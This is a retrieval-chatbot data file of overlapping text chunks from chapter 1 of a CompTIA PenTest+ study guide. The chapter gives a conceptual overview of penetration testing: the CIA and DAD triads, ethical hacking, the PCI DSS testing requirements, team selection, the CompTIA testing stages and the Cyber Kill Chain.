Disclosure attacks seek to gain unauthorized access to information or systems. Alteration attacks seek to make unauthorized changes to information or systems. Denial attacks seek to prevent legitimate use of information and systems. FIGURE 1.2 The DAD triad These two models, the CIA and DAD triads, are the cornerstones of cybersecurity. As shown in Figure 1.2, the elements of both models are directly correlated, with each leg of the attackers’ DAD triad directly corresponding to a leg of the CIA triad that is designed to counter those attacks. Confidentiality controls seek to prevent disclosure attacks. Integrity controls seek to prevent alteration attacks. Availability controls seek to keep systems running, preventing denial attacks. Adopting the Hacker Mindset If you've been practicing cybersecurity for some time, you're probably intimately familiar with the elements of the CIA triad. Cybersecurity defenders spend the majority of their time thinking in these terms, designing controls and defenses to protect information and systems against a wide array of known and unknown threats. Penetration testers must take a very different approach in their thinking. Instead of trying to defend against all possible threats, they only need
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Confidentiality controls seek to prevent disclosure attacks. Integrity controls seek to prevent alteration attacks. Availability controls seek to keep systems running, preventing denial attacks. Adopting the Hacker Mindset If you've been practicing cybersecurity for some time, you're probably intimately familiar with the elements of the CIA triad. Cybersecurity defenders spend the majority of their time thinking in these terms, designing controls and defenses to protect information and systems against a wide array of known and unknown threats. Penetration testers must take a very different approach in their thinking. Instead of trying to defend against all possible threats, they only need to find a single vulnerability that they might exploit to achieve their goals. To find these flaws, they must think like the adversary who might attack the system in the real world. This approach is commonly known as adopting the hacker mindset. Before we explore the hacker mindset in terms of technical systems, let's explore it using an example from the physical world. If you were responsible for the physical security of an electronics store, you might consider a variety of threats and implement controls designed to counter those threats. You'd be worried about shoplifting, robbery, and employee embezzlement, among other threats, and you might build a system of security controls that seeks to prevent those threats from materializing. These controls might include the following items: Security cameras in high‐risk areas Auditing of cash register receipts Theft detectors at the main entrance/exit of the store Exit alarms on emergency exits Burglar alarm wired to detect the opening of doors outside of business hours Now, imagine that you've been engaged to conduct a security assessment of this store. You'd likely examine each one of these security controls and assess its ability to prevent each of the threats identified in your initial risk assessment. You'd also look for gaps in the existing security controls that might require supplementation. Your mandate is broad and high‐level. Penetration tests, on the other hand, have a much more focused mandate. Instead of adopting the approach of a security professional, you adopt the mindset of an attacker. You don't need to evaluate the effectiveness of each security control. You simply need to find either one flaw in the existing controls or one scenario that was overlooked in planning those controls. In this example, a penetration tester might enter the store during business hours and conduct reconnaissance, gathering information about the security controls that are in place and the locations of critical merchandise. They might notice that although the burglar alarm is tied to the doors, it does not include any sensors on the windows. The tester might then return in the middle of the night, smash a window, and grab valuable merchandise. Recognizing that the store has security cameras in place, the attacker might wear a mask and park a vehicle outside of the range of the cameras. That's the hacker mindset. You need to think like a criminal. There's an important corollary to the hacker mindset
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	information about the security controls that are in place and the locations of critical merchandise. They might notice that although the burglar alarm is tied to the doors, it does not include any sensors on the windows. The tester might then return in the middle of the night, smash a window, and grab valuable merchandise. Recognizing that the store has security cameras in place, the attacker might wear a mask and park a vehicle outside of the range of the cameras. That's the hacker mindset. You need to think like a criminal. There's an important corollary to the hacker mindset that is important for both attackers and defenders to keep in mind. When conducting a penetration test (or a real‐world attack), the attacker needs to win only once. They might attempt hundreds or thousands of potential attacks against a target. The fact that an organization's security defenses block 99.99 percent of those attacks is irrelevant if one of the attacks succeeds. Cybersecurity professionals need to win every time. Attackers need to win only once. Ethical Hacking While penetration testers certainly must be able to adopt the hacker mindset, they must do so in a manner that demonstrates their own professionalism and integrity. Penetration testing is a subset of ethical hacking, which is the art of using hacking tools and techniques but doing so within a code of ethics that regulates activity. Some of the key components of ethical hacking programs are: Performing background checks on all members of the penetration testing team to identify and resolve any potential issues Adhering to the defined scope of a penetration testing engagement Immediately reporting any active security breaches or criminal activity detected during a penetration test Limiting the use of penetration testing tools to approved engagements Limiting the invasiveness of a penetration test based on the scope of the engagement Protecting the confidentiality of data and information related to or uncovered during a penetration test Cybersecurity professionals engaged in penetration testing work that exceeds the bounds of ethical hacking may find themselves subject to fees, fines, or even criminal charges depending on the nature of the violation. Reasons for Penetration Testing The modern organization dedicates extensive time, energy, and funding to a range of security controls and activities. We install firewalls, intrusion prevention systems, security information and event management (SIEM) solutions, vulnerability scanners, and many other tools. We equip and staff 24‐hour security operations centers (SOCs) to monitor those technologies and watch our systems, networks, and applications for signs of compromise. There's more than enough work to completely fill our days twice over. Why would we want to take on the additional burden of performing penetration tests? After all, they are time‐consuming to perform internally and expensive to outsource. The answer to this question is multifaceted and includes direct benefits as well as the need for adherence to applicable laws and regulatory requirements. Penetration testing provides us with visibility into the organization's security posture that simply isn't available by other means. Penetration testing
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	operations centers (SOCs) to monitor those technologies and watch our systems, networks, and applications for signs of compromise. There's more than enough work to completely fill our days twice over. Why would we want to take on the additional burden of performing penetration tests? After all, they are time‐consuming to perform internally and expensive to outsource. The answer to this question is multifaceted and includes direct benefits as well as the need for adherence to applicable laws and regulatory requirements. Penetration testing provides us with visibility into the organization's security posture that simply isn't available by other means. Penetration testing does not seek to replace all the other cybersecurity activities of the organization. Instead, it complements and builds on those efforts. Penetration testers bring their unique skills and perspectives to the table and can take the outputs of security tools and place them within the attacker's mindset, asking the question, “If I were an attacker, how could I use this information to my advantage?” Benefits of Penetration Testing We've already discussed how penetration testers carry out their work at a high level, and the remainder of this book is dedicated to exploring penetration testing tools and techniques in detail. Before we dive into that, let's take a moment to consider why we conduct penetration testing. What benefits does it bring to the organization? First and foremost, penetration testing provides us with knowledge that we can't obtain elsewhere. By conducting thorough penetration tests, we learn whether an attacker with the same knowledge, skills, and information as our testers would likely be able to penetrate our defenses. If they can't gain a foothold, we can then be reasonably confident that our networks are secure against attack by an equivalently talented attacker under the present circumstances. Second, in the event that attackers are successful, penetration testing provides us with an important blueprint for remediation. As cybersecurity professionals, we can trace the actions of the testers as they progressed through the different stages of the attack and close the series of open doors the testers passed through. Doing so provides us with a more robust defense against future attacks. Finally, penetration tests can provide us with essential, focused information about specific attack targets. We might conduct a penetration test prior to the deployment of a new system that is specifically focused on exercising the security features of that new environment. Unlike an open‐ended penetration test, which is broad in nature, focused tests can drill into the defenses around a specific target and provide actionable insight that can prevent a vulnerability from initial exposure. Threat Hunting The discipline of threat hunting is closely related to penetration testing but has a separate and distinct purpose. Like penetration testers, cybersecurity professionals engaged in threat hunting seek to adopt the hacker's mindset and imagine how attackers might seek to defeat an organization's security controls. The two disciplines diverge in what they accomplish with this information. Penetration testers seek to evaluate the organization's security controls by testing them in
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	test, which is broad in nature, focused tests can drill into the defenses around a specific target and provide actionable insight that can prevent a vulnerability from initial exposure. Threat Hunting The discipline of threat hunting is closely related to penetration testing but has a separate and distinct purpose. Like penetration testers, cybersecurity professionals engaged in threat hunting seek to adopt the hacker's mindset and imagine how attackers might seek to defeat an organization's security controls. The two disciplines diverge in what they accomplish with this information. Penetration testers seek to evaluate the organization's security controls by testing them in the same manner an attacker might, whereas threat hunters use the hacker mindset to search the organization's technology infrastructure for the artifacts of a successful attack. They ask themselves what an attacker might do and what type of evidence they might leave behind and then go in search of that evidence. Threat hunting builds on a cybersecurity philosophy known as the presumption of compromise. This approach assumes that attackers have already successfully breached an organization and searches out the evidence of successful attacks. When threat hunters discover a potential compromise, they then kick into incident‐handling mode, seeking to contain, eradicate, and recover from the compromise. They also conduct a postmortem analysis of the factors that contributed to the compromise in an effort to remediate deficiencies. This post‐event remediation is another similarity between penetration testing and threat hunting: Organizations leverage the output of both processes in similar ways. Regulatory Requirements for Penetration Testing There is one last reason that you might conduct a penetration test—because you must! The most common regulatory requirement for penetration testing comes from the Payment Card Industry Data Security Standard (PCI DSS). This regulation is a private contractual obligation that governs all organizations involved in the storage, processing, or transmission of credit and debit card transactions. Nestled among the more than 300 pages of detailed security requirements for cardholder data environments (CDEs) is Section 11.4, which reads as follows: External and internal penetration testing is regularly performed, and exploitable vulnerabilities and security weaknesses are corrected. There are some additional requirements for how the organization's penetration testing methodology should be conducted that appear in the detailed Requirement 11.4.1. According to that requirement, the organization should have a penetration testing methodology that is “defined, documented, and implemented by the entity, and includes: Industry accepted penetration testing approaches. Includes coverage for the entire CDE perimeter and critical systems. Testing from both inside and outside the network. Testing to validate any segmentation and scope‐reduction controls. Application‐layer penetration testing to include, at a minimum, the vulnerabilities listed in Requirement 6.2.4. Network‐layer penetration tests that encompass all components that support network functions as well as operating systems. Review and consideration of threats and vulnerabilities experienced in the last 12 months. Documented approach to assessing and addressing the risk posed by exploitable vulnerabilities and security weaknesses found during penetration testing. Retention of penetration testing results and remediation activities results for at least 12 months.”
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	for the entire CDE perimeter and critical systems. Testing from both inside and outside the network. Testing to validate any segmentation and scope‐reduction controls. Application‐layer penetration testing to include, at a minimum, the vulnerabilities listed in Requirement 6.2.4. Network‐layer penetration tests that encompass all components that support network functions as well as operating systems. Review and consideration of threats and vulnerabilities experienced in the last 12 months. Documented approach to assessing and addressing the risk posed by exploitable vulnerabilities and security weaknesses found during penetration testing. Retention of penetration testing results and remediation activities results for at least 12 months.” Source: Payment Card Industry Data Security Standard Version 4.0 Requirement 6.2.4 includes a listing of common vulnerabilities, such as SQL and other injections, buffer overflow, insecure cryptographic implementations, insecure communications, cross‐site scripting, improper access controls, cross‐site request forgery, broken authentication, and other “high‐risk” vulnerabilities. That section of PCI DSS provides a useful set of requirements for anyone conducting a penetration test. It's also a nice blueprint for penetration testing, even for organizations that don't have PCI DSS compliance obligations. The standard goes on to include additional requirements that describe the frequency and scope of penetration tests: 11.4.2. Internal penetration testing is performed: Per the entity's defined methodology. At least once every 12 months. After any significant infrastructure or application upgrade or change. By a qualified internal resource or qualified external third‐party. Organizational independence of the tester exists (not required to be a QSA or ASV). 11.4.2 External penetration testing is performed: Per the entity's defined methodology. At least once every 12 months. After any significant infrastructure or application upgrade or change. By a qualified internal resource or qualified external third‐party. Organizational independence of the tester exists (not required to be a QSA or ASV). 11.4.4. Exploitable vulnerabilities and security weaknesses found during penetration testing are corrected as follows: In accordance with the entity's assessment of the risk posed by the security issue as defined in Requirement 6.3.1. Penetration testing is repeated to verify the corrections. 11.4.5 If segmentation is used to isolate the CDE from other networks, penetration tests are performed on segmentation controls as follows: At least once every 12 months and after any changes to segmentation controls/methods. Covering all segmentation controls/methods in use. According to the entity's defined penetration testing methodology. Conforming that the segmentation controls/methods are operational and effective and isolate the CDE from all out‐of‐scope systems. Performed by a qualified internal resource or qualified external third party. Organizational independence of the tester exists (not required to be a QSA or ASV). Again, though these requirements are only mandatory for organizations subject to PCI DSS, they provide an excellent framework for any organization attempting to plan the frequency and scope of their own penetration tests. We'll cover compliance requirements for penetration testing in greater detail in Chapter 2, “Planning and Scoping Penetration Tests.” Organizations that must comply with PCI DSS should also read the detailed Information Supplement: Penetration Testing Guidance available from the PCI Security Standards Council
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Performed by a qualified internal resource or qualified external third party. Organizational independence of the tester exists (not required to be a QSA or ASV). Again, though these requirements are only mandatory for organizations subject to PCI DSS, they provide an excellent framework for any organization attempting to plan the frequency and scope of their own penetration tests. We'll cover compliance requirements for penetration testing in greater detail in Chapter 2, “Planning and Scoping Penetration Tests.” Organizations that must comply with PCI DSS should also read the detailed Information Supplement: Penetration Testing Guidance available from the PCI Security Standards Council at www.pcisecuritystandards.org/documents/Penetration-TestingGuidance-v1_1.pdf. This document covers in great detail how organizations should interpret these requirements. Who Performs Penetration Tests? Penetration testing is a highly skilled discipline, and organizations often try to have experienced penetration testers for their testing efforts. Given that you're reading this book and are preparing for the PenTest+ certification, you likely already understand and recognize this. If you don't have experience conducting penetration tests, that doesn't mean that all hope is lost. You may be able to participate in a test under the mentorship of an experienced penetration tester, or you may be able to conduct penetration testing in your organization simply because there's nobody with experience available to conduct the test. Penetration tests may be conducted by either internal teams, consisting of cybersecurity employees from the organization being tested, or external teams, consisting of contractors. Internal Penetration Testing Teams Internal penetration testing teams consist of cybersecurity professionals from within the organization who conduct penetration tests on the organization's systems and applications. These teams may be dedicated to penetration testing on a full‐time basis or they may be convened periodically to conduct tests on a part‐time basis. There are two major benefits of using internal teams to conduct penetration testing. First, they have contextual knowledge of the organization that can improve the effectiveness of testing by providing enhanced subject matter expertise. Second, it's generally less expensive to conduct testing using internal employees than it is to hire a penetration testing firm, provided that you have enough work to keep your internal team busy! The primary disadvantages to using internal teams to conduct penetration testing stem from the fact that you are using internal employees. These individuals may have helped to design and implement the security controls that they are testing, which may introduce conscious or unconscious bias toward demonstrating that those controls are secure. Similarly, the fact that they were involved in designing the controls may make it more difficult for them to spot potential flaws that could provide a foothold for an attacker. There's a bit of tricky language surrounding the use of the words internal and external when it comes to penetration tests. If you see these words used on the exam (or in real life!), be sure that you understand the context. Internal penetration tests may refer either to tests conducted by internal teams (as described in this section) or to tests conducted from an
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	demonstrating that those controls are secure. Similarly, the fact that they were involved in designing the controls may make it more difficult for them to spot potential flaws that could provide a foothold for an attacker. There's a bit of tricky language surrounding the use of the words internal and external when it comes to penetration tests. If you see these words used on the exam (or in real life!), be sure that you understand the context. Internal penetration tests may refer either to tests conducted by internal teams (as described in this section) or to tests conducted from an internal network perspective. The latter tests are designed to show what activity a malicious insider could engage in and may be conducted by either internal or external teams. Similarly, an external penetration test may refer to a test that is conducted by an external team or a test that is conducted from an external network perspective. If you do choose to use an internal penetration testing team, it is important to recognize that team members might be limited by a lack of independence. If at all possible, the penetration testing team should be organizationally separate from the cybersecurity team that designs and operates controls. However, this is usually not possible in any but the largest organizations due to staffing constraints. External Penetration Testing Teams External penetration testing teams are hired for the express purpose of performing a penetration test. They may come from a general cybersecurity consulting firm or one that specializes in penetration testing. These individuals are usually highly skilled at conducting penetration tests because they perform these tests all day, every day. When you hire a professional penetration testing team, you generally benefit from the use of very talented attackers. If you are subject to regulatory requirements that include penetration testing, be sure to understand how those requirements impact your selection of a testing team. External penetration testing teams also generally bring a much higher degree of independence than internal teams. However, organizations using an external team should still be aware of any potential conflicts of interest the testers may have. It might not be the best idea to hire the cybersecurity consultants who helped you design and implement your security controls to perform an independent test of those controls. They may be inclined to feel that any negative report they provide is a reflection on the quality of their own work. Selecting Penetration Testing Teams Penetration testing is not a one‐time process. Organizations may wish to require penetration testing for new systems upon deployment, but it is important to repeat those tests on a periodic basis for three reasons. First, the technology environment changes. Systems are reconfigured, patches are applied, updates and tweaks are made on a regular basis. Considered in isolation, each of these changes may have only a minor impact on the environment and may not reach the threshold for triggering a “significant change” penetration test, but collectively they may change the security posture of
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	of their own work. Selecting Penetration Testing Teams Penetration testing is not a one‐time process. Organizations may wish to require penetration testing for new systems upon deployment, but it is important to repeat those tests on a periodic basis for three reasons. First, the technology environment changes. Systems are reconfigured, patches are applied, updates and tweaks are made on a regular basis. Considered in isolation, each of these changes may have only a minor impact on the environment and may not reach the threshold for triggering a “significant change” penetration test, but collectively they may change the security posture of the environment. Periodic penetration tests have a good chance of detecting security issues introduced by those environmental changes. Second, attack techniques evolve over time as well, and updated penetration tests should reflect changing attack techniques. A system developed and tested today may receive a clean bill of health, but the exact same system tested two years from now may be vulnerable to an attack technique that simply wasn't known at the time of the initial test. Finally, each team member brings a unique set of skills, talents, and experiences to the table. Different team members may approach the test in different ways, and a team conducting a follow‐on test differently may discover a vulnerability that went unnoticed by the initial team. To maximize your chances of discovering these issues, you should take care when you select the members of a penetration testing team. When possible, rotating team members so they are testing systems, environments, and applications that they have never tested before helps bring a fresh perspective to each round of penetration tests. The CompTIA Penetration Testing Process The CompTIA PenTest+ curriculum divides the penetration testing process into five stages, as shown in Figure 1.3. FIGURE 1.3 CompTIA penetration testing stages This process captures the major activities involved in conducting a penetration test and will be the way that we approach organizing the content in the remainder of this book. If you look at CompTIA's PenTest+ Certification Exam Objectives document, you'll find that there are actually five domains of material covered by the exam. The five domains shown in Figure 1.3 each map to one of the stages of the penetration testing process. Engagement Management The military has a saying that resonates in the world of cybersecurity: “Prior planning prevents poor performance!” Although this sentiment is true for almost any line of work, it's especially important for penetration testing. Testers and their clients must have a clear understanding of what will occur during the penetration test, outline clear rules of engagement, and decide what systems, data, processes, and activities are within the authorized scope of the test. There's a fine line between penetration testing and hacking, and a written statement of work that includes clear authorization for penetration testing activities is crucial to ensuring that testers stay on the right side of the law and meet client expectations. Engagement management activities occur throughout the penetration test, but they do tend
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	line of work, it's especially important for penetration testing. Testers and their clients must have a clear understanding of what will occur during the penetration test, outline clear rules of engagement, and decide what systems, data, processes, and activities are within the authorized scope of the test. There's a fine line between penetration testing and hacking, and a written statement of work that includes clear authorization for penetration testing activities is crucial to ensuring that testers stay on the right side of the law and meet client expectations. Engagement management activities occur throughout the penetration test, but they do tend to be focused at the beginning and end of the process. For this reason, we cover the early‐stage objectives in Chapter 2, and then we come back to the concluding objectives toward the end of the book in Chapter 11, “Reporting and Communication.” Specifically, you'll learn how to meet the five objectives of this domain: 1.1 Summarize pre‐engagement activities. 1.2 Explain collaboration and communication activities. 1.3 Compare and contrast testing frameworks and methodologies. 1.4 Explain the components of a penetration test report. 1.5 Given a scenario, analyze the findings and recommend the appropriate remediation within a report. Reconnaissance and Enumeration Once a penetration testing team has a clearly defined scope and authorization to proceed with their work, they move on to the reconnaissance and enumeration phase. During this stage, they gather as much information as possible about the target environment. This information‐gathering process is crucial to the remainder of the penetration test, as the vulnerabilities identified during this stage provide the road map for the remainder of the test, highlighting weak links in an organization's security chain and potential paths of entry for attackers. We cover reconnaissance and enumeration in Chapters 3 and 12. In Chapter 3, “Information Gathering,” you'll learn about the use of open source intelligence and the Nmap scanning tool. In Chapter 12, “Scripting for Penetration Testing,” you will learn about scripting. Together, these two chapters cover the four objectives of this domain: 2.1 Given a scenario, apply information gathering techniques. 2.2 Given a scenario, apply enumeration techniques. 2.3 Given a scenario, modify scripts for reconnaissance and enumeration. 2.4 Given a scenario, use the appropriate tools for reconnaissance and enumeration. As you plan your cybersecurity certification journey, you should know that there is significant overlap between the material covered in this domain and the material covered in Domain 2 (Vulnerability Management) of the Cybersecurity Analyst+ (CySA+) exam. There is also quite a bit of overlap between the basic security concepts and tools covered by both exams. If you successfully pass the PenTest+ exam, you might want to consider immediately moving on to the CySA+ exam because you'll already have mastered about a third of the material covered on that test. Vulnerability Discovery and Analysis Penetration testers need information about vulnerabilities to carry out the remainder of their work. After gathering information about the systems and applications on the network, they move on to identify and evaluate specific
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Domain 2 (Vulnerability Management) of the Cybersecurity Analyst+ (CySA+) exam. There is also quite a bit of overlap between the basic security concepts and tools covered by both exams. If you successfully pass the PenTest+ exam, you might want to consider immediately moving on to the CySA+ exam because you'll already have mastered about a third of the material covered on that test. Vulnerability Discovery and Analysis Penetration testers need information about vulnerabilities to carry out the remainder of their work. After gathering information about the systems and applications on the network, they move on to identify and evaluate specific vulnerabilities that they might later exploit. In Chapter 4, “Vulnerability Scanning,” we begin a two‐chapter deep dive into vulnerability scanning, perhaps the most important information‐ gathering tool available to penetration testers. Chapter 4 covers how testers can design and perform vulnerability scans. In Chapter 5, “Interpreting Vulnerability Scan Results,” we move on to the analysis of vulnerability reports and their application to the penetration testing process. Combined, these chapters cover two objectives from Domain 3: 3.1 Given a scenario, conduct vulnerability discovery using various techniques. 3.2 Given a scenario, analyze output from reconnaissance, scanning, and enumeration phases. Attacks and Exploits After developing a clear testing plan and conducting reconnaissance and vulnerability analysis activities, penetration testers finally get the opportunity to move on to what most of us consider the fun stuff! It's time to attempt to exploit the vulnerabilities discovered during reconnaissance and penetrate an organization's network as deeply as possible, staying within the bounds established in the rules of engagement. The specific attack techniques used during a penetration test will vary based on the nature of the environment and the scope agreed to by the client, but there are some common techniques used in most tests. Half of this book is dedicated to exploring each of those topics in detail. Chapter 7, “Exploiting Network Vulnerabilities,” dives into attack techniques that focus on network devices and protocols. Chapter 9, “Exploiting Application Vulnerabilities,” is about software attacks, and Chapter 10, “Exploiting Host Vulnerabilities,” examines issues on servers and endpoints. Chapter 8, “Exploiting Physical and Social Vulnerabilities,” reminds us that many vulnerabilities aren't technical at all and that a penetration test that gains physical access to a facility or compromises members of an organization's staff can be even more dangerous than those that arrive over a network. Finally, Chapter 12, “Scripting for Penetration Testing,” covers a topic that's extremely important to penetration testers: applying coding skills to automate aspects of a penetration test. It will introduce you to the analysis of basic penetration testing scripts written in Bash, Python, and PowerShell. Combined, these chapters cover the following objectives: Domain 3: Vulnerability Discovery and Analysis 3.3 Explain physical security concepts. Domain 4: Attacks and Exploits 4.1 Given a scenario, analyze output to prioritize and prepare attacks. 4.2 Given a scenario, perform network attacks using the appropriate tools. 4.3 Given a scenario, perform authentication attacks using the appropriate tools. 4.4 Given a scenario, perform
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Penetration Testing,” covers a topic that's extremely important to penetration testers: applying coding skills to automate aspects of a penetration test. It will introduce you to the analysis of basic penetration testing scripts written in Bash, Python, and PowerShell. Combined, these chapters cover the following objectives: Domain 3: Vulnerability Discovery and Analysis 3.3 Explain physical security concepts. Domain 4: Attacks and Exploits 4.1 Given a scenario, analyze output to prioritize and prepare attacks. 4.2 Given a scenario, perform network attacks using the appropriate tools. 4.3 Given a scenario, perform authentication attacks using the appropriate tools. 4.4 Given a scenario, perform host‐based attacks using the appropriate tools. 4.5 Given a scenario, perform web application attacks using the appropriate tools. 4.6 Given a scenario, perform cloud‐based attacks using the appropriate tools. 4.7 Given a scenario, perform wireless attacks using the appropriate tools. 4.8 Given a scenario, perform social engineering attacks using the appropriate tools. 4.9 Explain common attacks against specialized systems. 4.10 Given a scenario, use scripting to automate attacks. Post‐exploitation and Lateral Movement After successfully gaining access to target systems, penetration testers then try to move around the network during the post‐exploitation and lateral movement phases of the process. Chapter 6, “Exploit and Pivot,” includes information on post‐lateral movement and Chapter 11, “Reporting and Communication,” explains the best practices for sharing penetration testing results with clients. Specifically, these two chapters cover the four objectives of this domain: 5.1 Given a scenario, perform tasks to establish and maintain persistence. 5.2 Given a scenario, perform tasks to move laterally throughout the environment. 5.3 Summarize concepts related to staging and exfiltration. 5.4 Explain cleanup and restoration activities. The Cyber Kill Chain The CompTIA penetration testing model described in the previous sections is an important way for penetration testers to structure their activities. There is an equally important counterpart to this model that describes how sophisticated attackers typically organize their work: the Cyber Kill Chain framework. This approach, pioneered by Lockheed Martin, consists of the seven stages shown in Figure 1.4. FIGURE 1.4 The Cyber Kill Chain framework Source: Adapted from Lockheed Martin Cybersecurity professionals seeking to adopt the hacker mindset can only do so if they understand how attackers plan and structure their work. The Cyber Kill Chain provides this framework. Captain Chesley “Sully” Sullenberger gave a talk on his heroic landing of US Airways Flight 1549 on New York's Hudson River in January 2009. In addition to being an outstanding pilot, Sully is a noted expert on aviation safety. One portion of his talk particularly resonated with this author and made him think of the Cyber Kill Chain. When describing the causes of aviation accidents, Sully said, “Accidents don't happen as the result of a single failure. They occur as the result of a series of unexpected events.” Security incidents follow a similar pattern, and penetration testers must be conscious of the series of events that lead to cybersecurity failures. The Cyber Kill Chain illustrates this well, showing the many stages of failure
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	2009. In addition to being an outstanding pilot, Sully is a noted expert on aviation safety. One portion of his talk particularly resonated with this author and made him think of the Cyber Kill Chain. When describing the causes of aviation accidents, Sully said, “Accidents don't happen as the result of a single failure. They occur as the result of a series of unexpected events.” Security incidents follow a similar pattern, and penetration testers must be conscious of the series of events that lead to cybersecurity failures. The Cyber Kill Chain illustrates this well, showing the many stages of failure that must occur before a successful breach. Reconnaissance The reconnaissance phase of the Cyber Kill Chain maps directly to the Reconnaissance and Enumeration phase of the penetration testing process. During this phase, attackers gather open source intelligence and conduct initial scans of the target environment to detect potential avenues of exploitation. Weaponization After completing the Reconnaissance phase of an attack, attackers move into the remaining six steps, which expand on the Vulnerability Discovery and Analysis and Attacking and Exploiting phases of the penetration testing process. The first of these phases is Weaponization. During this stage, the attackers develop a specific attack tool designed to exploit the vulnerabilities identified during reconnaissance. They often use automated toolkits to develop a malware strain specifically tailored to infiltrate their target. Delivery After developing and testing their malware weapon, attackers next must deliver that malware to the target. Delivery may occur through a variety of means, including exploiting a network or application vulnerability, conducting a social engineering attack, distributing malware on an infected USB drive or other media, or sending it as an email attachment or through other means. Exploitation Once the malware is delivered to the target organization, the attacker or the victim takes some action that triggers the malware's payload, beginning the Exploitation phase of the Cyber Kill Chain. During this phase, the malware gains access to the targeted system. This may occur when the victim opens a malicious file or when the attacker exploits a vulnerability over the network or otherwise gains a foothold on the target network. Installation The initial malware installation is designed only to enable temporary access to the target system. During the next phase of the Cyber Kill Chain, Installation, the attacker uses the initial access provided by the malware to establish permanent, or persistent, access to the target system. For this reason, many people describe the objective of this phase as establishing persistence in the target environment. Attackers may establish persistence by creating a back door that allows them to return to the system at a later date, by creating Registry entries that reopen access once an administrator closes it, or by installing a web shell that allows them to access the system over a standard HTTPS connection. Command and Control After establishing persistent access to a target system and network, the attacker may then use a remote shell or other means to remotely control the compromised
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	target system. For this reason, many people describe the objective of this phase as establishing persistence in the target environment. Attackers may establish persistence by creating a back door that allows them to return to the system at a later date, by creating Registry entries that reopen access once an administrator closes it, or by installing a web shell that allows them to access the system over a standard HTTPS connection. Command and Control After establishing persistent access to a target system and network, the attacker may then use a remote shell or other means to remotely control the compromised system. The attacker may manually control the system using the shell or may connect it to an automated command‐and‐control (C2C) network that provides it with instructions. This automated approach is common in distributed denial‐of‐service (DDoS) attacks where the attacker simultaneously directs the actions of thousands of compromised systems, known as a botnet. Actions on Objectives With a C2C mechanism in place, the attacker may then use the system to advance the original objectives of their attack. This may involve pivoting from the compromised system to other systems operated by the same organization, effectively restarting the Cyber Kill Chain. The Actions on Objectives stage of the attack may also include the theft of sensitive information, the unauthorized use of computing resources to engage in denial‐of‐service attacks or to mine cryptocurrency, or the unauthorized modification or deletion of information. Tools of the Trade Penetration testers use a wide variety of tools as they conduct their testing. The specific tools chosen for each assessment will depend on the background of the testers, the nature of the target environment, and the rules of engagement, among many other factors. The PenTest+ exam requires that candidates understand the purposes of a wide range of tools. In fact, the official exam objectives include listings of tools that you'll need to understand before taking the exam. Although you must be familiar with these tools, you don't have to be an expert in their use. Exam Tip As you prepare for the exam, you should certainly understand the purpose of each tool. You should be able to describe the purpose of each of these tools in a coherent sentence. Additionally, you should be able to read a scenario and perform related tasks using relevant tools, summarize concepts, or explain activities for meeting objectives. Keep this in mind as you work your way through the remainder of this book! Summary Penetration testing is an important practice that allows cybersecurity professionals to assess the security of environments by adopting the hacker mindset. By thinking like an attacker, testers are able to identify weaknesses in the organization's security infrastructure and potential gaps that may lead to future security breaches. The CompTIA penetration testing process includes five phases: Engagement Management, Reconnaissance and Enumeration, Vulnerability Discovery and Analysis, Attacks and Exploits, and Post‐exploitation and Lateral Movement. Penetration testers follow each of these phases to ensure that they have a well‐designed test that operates using
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	work your way through the remainder of this book! Summary Penetration testing is an important practice that allows cybersecurity professionals to assess the security of environments by adopting the hacker mindset. By thinking like an attacker, testers are able to identify weaknesses in the organization's security infrastructure and potential gaps that may lead to future security breaches. The CompTIA penetration testing process includes five phases: Engagement Management, Reconnaissance and Enumeration, Vulnerability Discovery and Analysis, Attacks and Exploits, and Post‐exploitation and Lateral Movement. Penetration testers follow each of these phases to ensure that they have a well‐designed test that operates using agreed‐upon rules of engagement. Penetration testers use a wide variety of tools to assist in their work. These are many of the same tools used by cybersecurity professionals, malicious actors, network engineers, system administrators, and software developers. Tools assist with all stages of the penetration testing process, especially information gathering, vulnerability identification, and exploiting vulnerabilities during attacks. Exam Essentials Know how the CIA and DAD triads describe the goals of cybersecurity professionals and attackers. Cybersecurity professionals strive to protect the confidentiality, integrity, and availability of information and systems. Attackers seek to undermine these goals by achieving the goals of disclosure, alteration, and denial. Be able to name several important benefits of penetration testing. Penetration testing provides knowledge about an organization's security posture that can't be obtained elsewhere. It also provides a blueprint for the remediation of security issues. Finally, penetration tests provide focused information on specific attack targets. Understand that penetration testing may be conducted to meet regulatory requirements. The Payment Card Industry Data Security Standard (PCI DSS) requires that organizations involved in the processing of credit card transactions conduct both internal and external penetration tests on an annual basis. Describe how both internal and external teams may conduct penetration tests. Internal teams have the benefit of inside knowledge about the environment. They also operate more cost‐effectively than external teams. External penetration testers have the benefit of organizational independence from the teams who designed and implemented the security controls. Know the five phases of the penetration testing process. Penetration testers begin in the Engagement Management phase, where they develop a statement of work and agree with the client on rules of engagement. They then move into reconnaissance efforts during the Reconnaissance and Enumeration phase. The information collected is then used to discover vulnerabilities in the Vulnerability Discovery and Analysis phase and conduct attacks during the Attacks and Exploits phase. After the final phase, Post‐exploitation and Lateral Movement, the team shares its findings with the target organization. Describe the tools used by penetration testers. Tools designed for use by cybersecurity professionals and other technologists may also assist penetration testers in gathering information and conducting attacks. Penetration testers use specialized exploitation frameworks, such as Metasploit, to help automate their work. Lab Exercises Activity 1.1: Adopting the Hacker Mindset Before we dive into the many technical examples throughout this book, let's try an example of applying the hacker mindset to everyday life. Think
